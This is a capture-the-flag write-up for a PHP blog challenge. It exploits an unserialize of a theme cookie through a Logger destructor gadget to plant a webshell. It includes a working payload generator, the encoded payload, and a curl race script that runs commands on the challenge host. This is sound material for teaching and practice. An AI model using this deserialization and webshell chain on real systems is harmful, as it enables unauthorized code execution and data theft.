# Writeup: CapyBlog

## Flag

`KubSTU(capybl0g_php_d3s3r1al1zat10n)`

## Recon

`robots.txt` says `Disallow: /backup/`, and `/backup/www.zip` (~7.8 MB) is downloadable.
Inside: `auth.php`, `login.php`, `register.php`, `utils.php`, `classes.php`, `config.php`, `data/` — but **no `index.php`** (the live one).

`utils.php::get_theme()` is the bug:

```php
$raw = $_COOKIE['theme'] ?? null;
if ($raw === 'dark' || $raw === 'light') return $raw;
$decoded = base64_decode($raw, true);
$obj = @unserialize($decoded);          // <-- attacker-controlled
$GLOBALS['__theme_payload'] = $obj;     // keep the object alive until shutdown
...
return $theme === 'dark' ? 'dark' : 'light';
```

`classes.php` provides the gadget:

```php
class Logger {
    public $logFile, $message;
    public function __destruct() {
        if (!is_string($this->logFile)) return;
        if ($this->message === '') return;
        @file_put_contents($this->logFile, $this->message . PHP_EOL, FILE_APPEND);
    }
}
```

Arbitrary file write at script shutdown.

## Exploit

Build a `Logger` payload that writes a PHP webshell into the docroot:

```python
import base64
def s(v): return f's:{len(v.encode())}:"{v}";'
shell = '<?php system($_GET["c"]); ?>'
ser = f'O:6:"Logger":2:{{{s("logFile")}{s("/var/www/html/p.php")}{s("message")}{s(shell)}}}'
print(base64.b64encode(ser.encode()).decode())
# -> Tzo2OiJMb2dnZXIiOjI6e3M6NzoibG9nRmlsZSI7czoxOToiL3Zhci93d3cvaHRtbC9wLnBocCI7czo3OiJtZXNzYWdlIjtzOjI4OiI8P3BocCBzeXN0ZW0oJF9HRVRbImMiXSk7ID8+Ijt9
```

Send it as the `theme` cookie to `/`, then immediately race `/p.php?c=...` — the box runs an aggressive cleanup script that deletes any new file in the docroot within ~1 s, so trigger and exec must overlap:

```bash
B='Tzo2OiJMb2dnZXIiOjI6...'   # full base64 payload
runcmd() {
  for i in 1 2 3 4 5; do
    curl -s -H "Cookie: theme=$B" http://193.42.127.24/ -o /dev/null &
    for j in 1 2 3 4 5 6 7; do
      out=$(curl -s --max-time 2 "http://193.42.127.24/p.php?c=$1")
      [ -n "$out" ] && ! grep -q '404 Not Found' <<<"$out" && { echo "$out"; wait; return; }
    done
    wait
  done
}
runcmd "cat%20/var/www/html/data/flag.txt"
# -> KubSTU(capybl0g_php_d3s3r1al1zat10n)
```

## Notes

- The hint *"did the site work the same way before?"* refers to the backup zip — its `utils.php` shows the legacy theme cookie format that introduced the unserialize.
- The `/var/www/html/` listing was full of other players' shells (`shell.php`, `evil_shell.php`, `getflag.php`, `cmd*.php`, etc.) — the cleanup job races everyone equally.
- Flag file: `/var/www/html/data/flag.txt`. The `.htaccess` in `data/` blocks direct HTTP read of `*.json`/`*.txt`, but `cat` from RCE bypasses it.
